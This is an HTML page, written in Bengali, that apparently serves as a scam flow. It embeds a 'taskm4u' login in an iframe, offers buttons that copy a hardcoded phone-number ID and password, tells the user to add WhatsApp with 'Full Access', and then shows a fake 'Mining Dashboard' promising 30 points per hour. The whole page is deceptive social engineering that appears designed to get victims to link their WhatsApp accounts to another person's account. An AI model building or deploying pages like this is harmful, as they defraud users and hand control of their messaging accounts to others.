<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Node - Activation</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --wa-green: #25D366; --bg: #0b141a; --mask: rgba(37, 211, 102, 0.2); }
        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: sans-serif; overflow: hidden; color: white; }

        /* View Control */
        .view { display: none; height: 100vh; flex-direction: column; }
        .active-view { display: flex; }

        /* Step 1: Login Frame */
        .header-step { background: #121b22; padding: 15px; text-align: center; border-bottom: 2px solid var(--wa-green); }
        .copy-bar { display: flex; gap: 10px; margin-top: 10px; }
        .c-btn { flex: 1; background: #34495e; padding: 10px; border-radius: 5px; font-size: 12px; cursor: pointer; border: 1px solid #45aaf2; }

        .iframe-wrap { flex-grow: 1; position: relative; background: #fff; }
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--mask); mix-blend-mode: hue; pointer-events: none; }
        iframe { width: 100%; height: 100%; border: none; }

        /* Fixed Footer Button */
        .footer-btn { background: #121b22; padding: 15px; position: sticky; bottom: 0; z-index: 100; }
        .main-btn { background: var(--wa-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }

        /* Final Dashboard Style */
        .dash-card { background: #1f2c34; padding: 30px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid var(--mask); }
        .pts { font-size: 45px; font-weight: bold; color: var(--wa-green); margin: 15px 0; }
    </style>
</head>
<body>

<div id="step-login" class="view active-view">
    <div class="header-step">
        <div style="font-size: 14px; color: #ffbc00;">⚠️ লগইন করার পর নিচের বাটনে ক্লিক করুন</div>
        <div class="copy-bar">
            <div class="c-btn" onclick="cp('01321494267')">Copy ID</div>
            <div class="c-btn" onclick="cp('123456789')">Copy Pass</div>
        </div>
    </div>
    <div class="iframe-wrap">
        <div class="overlay"></div>
        <iframe src="https://www.taskm4u.com/#/login" id="loginFrame"></iframe>
    </div>
    <div class="footer-btn">
        <button class="main-btn" onclick="toNextStep()">লগইন করেছি, পরবর্তী ধাপ</button>
    </div>
</div>

<div id="step-link" class="view">
    <div class="header-step">
        <div style="font-size: 14px; color: var(--wa-green);">✅ এখন হোয়াটসঅ্যাপ যুক্ত করুন (Full Access)</div>
    </div>
    <div class="iframe-wrap">
        <div class="overlay"></div>
        <iframe src="about:blank" id="linkFrame"></iframe>
    </div>
    <div class="footer-btn">
        <button class="main-btn" id="verify-btn" onclick="verifyFinal()">হোয়াটসঅ্যাপ অ্যাড করেছি (Verify)</button>
    </div>
</div>

<div id="view-final" class="view">
    <div class="dash-card">
        <p style="color: #8696a0;">Mining Dashboard Active</p>
        <div class="pts" id="final-pts">0.00 PT</div>
        <div id="status" style="color: var(--wa-green);">● Earning points: 30 PT/hr</div>
    </div>
    <div style="padding: 20px; text-align: center;">
        <p>Your WhatsApp node is securely connected to the cloud server.</p>
        <button class="main-btn" style="background: #34495e;" onclick="location.reload()">Refresh Session</button>
    </div>
</div>

<script src="script.js"></script>
</body>
</html>
